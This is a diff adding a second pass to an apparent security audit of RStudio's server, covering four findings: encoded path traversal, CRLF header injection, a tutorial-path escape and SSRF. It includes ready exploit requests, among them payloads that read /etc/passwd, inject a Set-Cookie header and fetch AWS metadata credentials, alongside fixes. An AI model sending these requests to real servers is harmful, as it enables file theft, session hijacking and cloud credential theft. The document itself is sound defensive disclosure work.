@@ -610,14 +610,308 @@ On Windows, if renderer is compromised (XSS) and `nodeIntegration` is enabled or
 
 ---
 
-## 5. Recommendations
+## 5. New Findings — Second Pass (GET/Method Confusion/CRLF/SSRF)
+
+The following additional vulnerabilities were identified in the second pass, focused on method confusion, URL encoding bypasses, response header injection, and SSRF. All are new — not duplicating VULN-01 through VULN-08.
+
+---
+
+### VULN-09 — URL-Encoded `..` Bypasses Path Traversal Check in `/files/` (HIGH)
+
+**Endpoint:** `GET /files/<path>` (server mode only)
+**Parameter:** URI path component (percent-encoded)
+**Source:** `SessionFiles.cpp:591` — `..` check on raw URI
+**Sink:** `SessionFiles.cpp:607` — `completePath(relativePath)` after decoding
+**Type:** Path Traversal via Percent-Encoding Bypass
+
+#### Code Path
+
+```cpp
+// SessionFiles.cpp:583
+std::string uri = request.uri();  // RAW, not decoded — %2e%2e intact
+
+// Line 591 — check is on the ENCODED uri, before decoding
+if (uri.find("..") != std::string::npos)
+{
+    pResponse->setNotFoundError(request);
+    return;
+}
+
+// Line 599 — URL decoding happens AFTER the check
+std::string relativePath = http::util::urlDecode(uri.substr(prefixLen));
+//                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+//                         %2e%2e → ".." only here, after the guard passed
+
+// Line 607 — completePath() has NO containment check
+FilePath filePath = module_context::userHomePath().completePath(relativePath);
+```
+
+#### Why This Bypasses the Guard
+
+`request.uri()` returns the raw, undecoded request URI. The `..` string search is done against the encoded URI. `%2e%2e` decodes to `..` but contains no literal `.` characters adjacent, so `find("..")` returns `std::string::npos` — the check passes.
+
+After the guard, `urlDecode()` converts `%2e%2e` to `..`. The result is passed to `completePath()` (not `completeChildPath()`) — no containment check is performed.
+
+Contrast with `pathAfterPrefix()` (used in other handlers) which calls `URL::cleanupPath()` first — this would normalize `..` before they could be used for traversal, but `handleFilesRequest` does not use `pathAfterPrefix`.
+
+#### Exploit
+
+```
+GET /files/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
+```
+
+1. `uri.find("..")` → not found (raw URI has `%2e%2e`, not `..`) → check passes
+2. `urlDecode(...)` → `"../../../../../../etc/passwd"`
+3. `completePath("../../../../../../etc/passwd")` → `/etc/passwd` (no bounds check)
+4. File contents returned in response body
+
+**Impact:** Server mode only. Authenticated read of any file the session user process can open — `/etc/passwd`, `/etc/shadow` (if user is root), SSH keys, database files.
+
+---
+
+### VULN-10 — CRLF Header Injection via Referer in Help Redirect (HIGH)
+
+**Endpoint:** `GET /help/*` (any path causing an R httpd 302 redirect)
+**Parameter:** `Referer` request header (user-controlled)
+**Source:** `SessionHelp.cpp:495`
+**Sink:** `SessionHelp.cpp:497` — `pResponse->setHeader("Location", redirect)`
+**Type:** CRLF Injection / HTTP Response Splitting
+
+#### Code Path
+
+```cpp
+// SessionHelp.cpp:477-498
+if (code == 302 && pResponse->containsHeader("Location"))
+{
+    std::string location = pResponse->headerValue("Location");
+    std::string rPort = module_context::rLocalHelpPort();
+    std::string rHelpPrefix = fmt::format("http://127.0.0.1:{}/", rPort);
+
+    if (boost::algorithm::starts_with(location, rHelpPrefix))
+    {
+        std::string path = location.substr(rHelpPrefix.length());
+
+        // Line 495 — Referer header taken from request with NO sanitization
+        std::string ref = request.headerValue("Referer");
+
+        // Line 496 — ref is concatenated directly into the Location value
+        std::string redirect = fmt::format("{}help/{}", ref, path);
+
+        // Line 497 — setHeader() performs NO CRLF filtering on the value
+        pResponse->setHeader("Location", redirect);
+        //                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        //                              safeLocation() is NOT called here
+        //                              (compare: setMovedTemporarily uses safeLocation())
+    }
+}
+```
+
+#### Why `setHeader` Does Not Protect Here
+
+`Message::setHeader()` (`Message.cpp:110`) stores the raw string value — no CRLF stripping. In contrast, `setMovedTemporarily()` (`Response.cpp:611`) calls `safeLocation()` before `setHeader`, which splits on `\r\n` and takes only the first line. The help redirect handler bypasses `setMovedTemporarily` and calls `setHeader` directly, skipping `safeLocation`.
+
+RStudio runs its own HTTP/1.1 server (Boost.Asio). Header serialization writes `Name: Value\r\n` with the raw stored value. If the value contains `\r\n`, it produces injected header lines in the HTTP response.
+
+#### Exploit Preconditions
+
+1. Any help request that causes R's internal httpd to issue a `302 Location: http://127.0.0.1:<port>/...` redirect. Examples: visiting `/help/` root, navigating between help topics in many packages.
+2. The attacker sends (or tricks the browser into sending) a request to `/help/` with a crafted `Referer` header.
+
+In a direct HTTP context (e.g., curl, proxy, server-side script):
+```
+GET /help/ HTTP/1.1
+Referer: http://rstudio.example.com/\r\nSet-Cookie: session=hijacked; Path=/\r\nX-Injected: yes
+```
+
+Response:
+```
+HTTP/1.1 302 Found
+Location: http://rstudio.example.com/
+Set-Cookie: session=hijacked; Path=/
+X-Injected: yes
+help/doc/html/index.html
+...
+```
+
+#### Impact
+
+- **Session fixation:** Inject `Set-Cookie: sessionid=attacker-chosen` into the response.
+- **Cache poisoning:** If a proxy caches the malformed response.
+- **Secondary XSS:** Inject a `Content-Type: text/html` line followed by a blank line and an HTML payload to terminate the headers and inject a response body.
+
+---
+
+### VULN-11 — Path Traversal in Tutorial File Handler via URL Normalization (HIGH)
+
+**Endpoint:** `GET /tutorial/<path>.png`
+**Parameter:** URI path component
+**Source:** `SessionTutorial.cpp:337` — `pathAfterPrefix(request, "/tutorial/")`
+**Sink:** `SessionTutorial.cpp:344` — `resourcesPath.completePath(path)` with absolute path
+**Type:** Path Traversal — URL normalization strips prefix, leaving absolute path
+
+#### Code Path
+
+```cpp
+// SessionTutorial.cpp:331
+void handleTutorialFileRequest(const http::Request& request, http::Response* pResponse)
+{
+    FilePath resourcesPath =
+          options().rResourcesPath().completePath("tutorial_resources");
+
+    // pathAfterPrefix calls URL::cleanupPath FIRST, then strips the prefix
+    std::string path = http::util::pathAfterPrefix(request, "/tutorial/");
+    if (path.empty())
+    {
+       pResponse->setStatusCode(http::status::NotFound);
+       return;
+    }
+
+    // completePath() is used — NOT completeChildPath() — NO containment check
+    pResponse->setCacheableFile(resourcesPath.completePath(path), request);
+}
+```
+
+```cpp
+// Util.cpp:389 — pathAfterPrefix internals:
+std::string pathAfterPrefix(const Request& request, const std::string& pathPrefix)
+{
+    std::string uri = URL::cleanupPath(request.uri());  // Step 1: normalize ..
+    //                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    //  /tutorial/../../etc/evil.png → /etc/evil.png
+    //  (cleanup removes .. components but preserves the resulting absolute path)
+
+    if (!uri.compare(0, pathPrefix.length(), pathPrefix))  // Step 2: strip prefix
+        uri = uri.substr(pathPrefix.length());
+    //  "/etc/evil.png" does NOT start with "/tutorial/" → prefix NOT stripped
+    //  uri remains "/etc/evil.png"
+
+    return http::util::urlDecode(uri);  // Step 3: url decode
+    //  returns "/etc/evil.png" — still an absolute path
+}
+```
+
+#### Why This Escapes the Tutorial Directory
+
+`URL::cleanupPath` resolves `..` lexically (via the `Path::cleanup()` class). For `GET /tutorial/../../etc/evil.png`:
+
+1. `cleanupPath("/tutorial/../../etc/evil.png")` → `"tutorial"` resolved, first `..` removes it, second `..` is at root and discarded → result: `"/etc/evil.png"`
+2. `"/etc/evil.png"` does not start with `"/tutorial/"` → prefix NOT stripped → returned as-is
+3. `resourcesPath.completePath("/etc/evil.png")` — `completePath()` calls `boost::filesystem::complete()`:  if the argument is **absolute** (starts with `/`), it is returned unchanged regardless of `resourcesPath`
+4. `setCacheableFile("/etc/evil.png", request)` → file served
+
+The **empty check** at line 338 (`if (path.empty())`) does not guard against absolute paths — `"/etc/evil.png"` is not empty.
+
+#### Exploit
+
+```
+GET /tutorial/../../etc/evil.png HTTP/1.1
+```
+
+This works if any `.png` file exists at the traversed path. More powerful: the attacker can also traverse to any `.png` file they previously placed (e.g., in a known temp location):
+
+```
+GET /tutorial/../../tmp/stolen_data.png HTTP/1.1
+```
+
+The dispatch in `handleTutorialRequest` routes to `handleTutorialFileRequest` for any path ending in `.png`:
+```cpp
+else if (boost::algorithm::ends_with(path, ".png"))
+    handleTutorialFileRequest(request, pResponse);
+```
+
+After cleanup, `path` = `/etc/evil.png` which ends with `.png` → routed.
+
+**Impact:** Read any `.png`-named file the RStudio session process user can access. Combined with a rename/symlink or placed `.png` file, allows broader file read.
+
+---
+
+### VULN-12 — SSRF via `download_data_file` JSON-RPC (MEDIUM)
+
+**Endpoint:** JSON-RPC `download_data_file` (POST `/rpc/`, authenticated + CSRF-guarded)
+**Parameter:** `url` (first RPC parameter)
+**Source:** `SessionDataImport.R:40`
+**Sink:** `SessionDataImport.R:44` — `download.file(url, downloadPath)`
+**Type:** Server-Side Request Forgery
+
+#### Code Path
+
+```r
+# SessionDataImport.R:40
+.rs.addJsonRpcHandler("download_data_file", function(url)
+{
+   downloadPath <- tempfile("data")
+   download.file(url, downloadPath)  # ← url is raw, unvalidated user input
+   ...
+})
+```
+
+#### No URL Validation
+
+`download.file()` supports `http://`, `https://`, and `ftp://` URLs. No whitelist, no blocklist, no scheme check. Any URL can be fetched by the server process, including:
+- `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDS)
+- `http://127.0.0.1:8080/admin/` (internal admin panels)
+- `file:///etc/passwd` (in some configurations)
+- `http://10.0.0.1/internal-api`
+
+#### Exploit
+
+From an authenticated session (JavaScript console in RStudio frontend):
+```javascript
+Shiny.setInputValue || window.opener
+// Or via R console:
+```
+```r
+.rs.api.sendRpcRequest("download_data_file", list("http://169.254.169.254/latest/meta-data/iam/security-credentials/"))
+```
+
+Or via direct HTTP POST (with valid CSRF header + session cookie):
+```
+POST /rpc/download_data_file HTTP/1.1
+X-RS-CSRF-Token: <token-from-cookie>
+Cookie: rstudio=<session>
+Content-Type: application/json
+
+{"method":"download_data_file","params":["http://169.254.169.254/latest/meta-data/iam/security-credentials/"],"clientId":1,"id":1}
+```
+
+The server downloads the URL and returns the downloaded file path. If the downloaded content is a dataset, it can then be previewed via `get_data_preview`, exposing its contents.
+
+**Note:** This requires a valid authenticated session + CSRF header (not directly GET-exploitable), but any authenticated user can probe internal network resources the server has access to.
+
+**Impact:** Internal network reconnaissance, cloud metadata credential theft (AWS/GCP/Azure IMDS), internal service data exfiltration.
+
+---
+
+## 5. Finding Summary — All Vulnerabilities
+
+| ID | Endpoint | Parameter | Source | Sink | Type | Severity |
+|---|---|---|---|---|---|---|
+| VULN-01 | `GET /content` | `file` (query) | `SessionContentUrls.cpp:99` | `:102` | Path Traversal — no containment check | **CRITICAL** |
+| VULN-02 | `GET /themes/custom/local/*` | URI path | `SessionThemes.cpp:622` | `:624` | Path Traversal — symlink bypass | **HIGH** |
+| VULN-03 | `GET /show/*` | URI path | `SessionFiles.cpp:637` | `:659` | Path Traversal — no guard (desktop) | **HIGH** |
+| VULN-04 | `GET /html_preview/*` | URI path | `SessionHTMLPreview.cpp:964` | `setFile()` | Path Traversal — symlink bypass | **HIGH** |
+| VULN-05 | `GET /tutorial/run` | `package`, `name` | `SessionTutorial.cpp:174` | `:177` | R param injection — no whitelist | **MEDIUM** |
+| VULN-06 | Rmd Knit | `knit:` YAML field | `SessionRMarkdown.R:170` | `SessionRMarkdown.cpp:629` | R Code Injection — unescaped format | **MEDIUM** |
+| VULN-07 | JSON-RPC `get_script_run_command` | `interpreter` | `SessionSource.cpp:1560` | `:1606` | R Code Injection — unescaped concat | **MEDIUM** |
+| VULN-08 | Electron IPC `desktop_install_rtools` | `version`, `installerPath` | `gwt-callback.ts:975` | `:983` | OS Command Injection via `exec()` | **HIGH (Win)** |
+| VULN-09 | `GET /files/<path>` | URI path (`%2e%2e`) | `SessionFiles.cpp:591` | `:607` | Path Traversal — encoding bypass | **HIGH** |
+| VULN-10 | `GET /help/*` | `Referer` header | `SessionHelp.cpp:495` | `:497` | CRLF Injection — header injection | **HIGH** |
+| VULN-11 | `GET /tutorial/*.png` | URI path | `SessionTutorial.cpp:337` | `:344` | Path Traversal — normalization escape | **HIGH** |
+| VULN-12 | JSON-RPC `download_data_file` | `url` param | `SessionDataImport.R:40` | `:44` | SSRF — no URL validation | **MEDIUM** |
+
+---
+
+## 6. Recommendations
 
 | Priority | Fix |
 |---|---|
 | P0 | **VULN-01**: Replace `completePath()` with `completeChildPath()` in `contentFileInfo()`. |
-| P0 | **VULN-03**: In `handleShowRequest()`, add explicit path containment check using `realpath()`-based canonicalization, not just lexical `isWithin()`. |
+| P0 | **VULN-09**: In `handleFilesRequest()`, URL-decode the URI before checking for `..`, or use `pathAfterPrefix()` which applies `cleanupPath()` first. |
+| P0 | **VULN-11**: In `handleTutorialFileRequest()`, replace `completePath(path)` with `completeChildPath(path)`. If path is absolute, reject it. |
+| P1 | **VULN-10**: In `handleHttpdResult()`, replace the direct `setHeader("Location", redirect)` call with `setMovedTemporarily(request, ...)`, or apply `safeLocation()` to the Referer-derived value before use. |
 | P1 | **VULN-02/03/04**: Update `isWithin()` to use `boost::filesystem::weakly_canonical()` or POSIX `realpath()` before comparing paths, to eliminate symlink bypass. |
 | P1 | **VULN-08**: Replace `exec(command_string)` with `spawn(binary, [args])` using an argument array to prevent shell interpretation. |
-| P2 | **VULN-06**: Apply `singleQuotedStrEscape()` (or equivalent) to `renderFunc` before embedding in `boost::format` at `SessionRMarkdown.cpp:622`. |
-| P2 | **VULN-07**: In `getScriptRunCommand()`, escape `interpreter` and `path` for embedding inside a double-quoted R string, or refuse characters that break out of the string context. |
-| P3 | **VULN-05**: Validate `package` parameter against installed package names using `find.packages()` before passing to `.rs.tutorial.runTutorial`. |
+| P2 | **VULN-12**: Add URL validation to `download_data_file`: reject non-`http(s)://` schemes, block RFC1918/loopback/link-local ranges, block cloud metadata endpoints. |
+| P2 | **VULN-06**: Apply `singleQuotedStrEscape()` to `renderFunc` at `SessionRMarkdown.cpp:629`. |
+| P2 | **VULN-07**: Escape `interpreter` for double-quoted R string context in `getScriptRunCommand()`. |
+| P3 | **VULN-05**: Validate `package` parameter against `find.packages()` output. |
